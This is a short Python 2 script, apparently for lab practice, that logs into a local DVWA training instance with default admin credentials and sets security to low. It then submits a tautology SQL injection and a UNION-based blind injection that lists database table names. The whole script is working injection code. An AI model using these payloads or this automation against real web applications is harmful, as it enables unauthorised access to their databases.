import mechanize
import datetime
from bs4 import BeautifulSoup
import sys

class DVWA(object):
    LOGIN_FORM  = 0
    LOGIN      = {'username': 'admin', 'password': 'password'}
    URL        = 'http://192.168.1.109/dvwa/index.php'
    SQLi_PAGE  = 'http://192.168.1.109/dvwa/vulnerabilities/sqli'
    SECURITY_PAGE = 'http://192.168.1.109/dvwa/security.php'
    SEC_LEVEL = 'low'
    INJECTOR  = "' or ' 1 = 1"
    BLIND_PAGE = "http://192.168.1.109/dvwa/vulnerabilities/sqli_blind/"
    BLIND_INJECTOR = "1' and 1=0 union select null,table_name from information_schema.tables#"
    
    def __init__(self):
        self.browser = self._connect()
        self._login()
        
    def security(self):
        self.browser.open(self.SECURITY_PAGE)
        print >> sys.stderr, "[+] security"
        print >> sys.stderr, "\t{0}".format(self.browser.title())
        
        self.browser.select_form(nr = 0)
        self.browser.form['security'] = [self.SEC_LEVEL]
        self.browser.submit()
    
    def _login(self):
        self.browser.select_form(nr = self.LOGIN_FORM)
        for k, v in self.LOGIN.iteritems():
                self.browser.form[k] = v

        self.browser.submit()
        print >> sys.stderr, "(+) login"
        print >> sys.stderr, "\t{0}".format(self.browser.title())
    
    def _connect(self):
        br = mechanize.Browser()
        br.open(self.URL)
        print >> sys.stderr, "[+] connect"
        print >> sys.stderr, "\t{0}".format(br.title())
        
        return br
    
    def _dump(self, tags):
        for d in tags:
            print >> sys.stderr, "\t{0}".format(d)
    
    def SQLi(self):
        self.browser.open(self.SQLi_PAGE)
        print >> sys.stderr, "[+] SQLi"
        print >> sys.stderr, "\t{0} ... injecting \"{1}\"".format(self.browser.title(), self.INJECTOR)
        self.browser.select_form(nr = 0)
        self.browser.form['id'] = self.INJECTOR
        self.browser.submit()
        page = self.browser.response().read()
        bs = BeautifulSoup(page, 'lxml')
        all_pre = bs.find_all('pre')
        self._dump(all_pre)
        
    def blind(self):
        self.browser.open(self.BLIND_PAGE)
        print >> sys.stderr, "[+] blind SQLi"
        print >> sys.stderr, "\t{0} ... injecting \"{1}\"".format(self.browser.title(), self.BLIND_INJECTOR)
        self.browser.select_form(nr = 0)
        self.browser.form['id'] = self.BLIND_INJECTOR
        self.browser.submit()
        page = self.browser.response().read()
        bs = BeautifulSoup(page, 'lxml')
        all_pre = bs.find_all('pre')
        self._dump(all_pre)

if __name__ == "__main__":
    print >> sys.stderr, "[+] starting {0} on {1}".format(sys.argv[0], str(datetime.datetime.now()))
    hackme = DVWA()
    hackme.security()
    hackme.SQLi()
    hackme.blind()
    print >> sys.stderr, "[+] end on {0}".format(str(datetime.datetime.now()))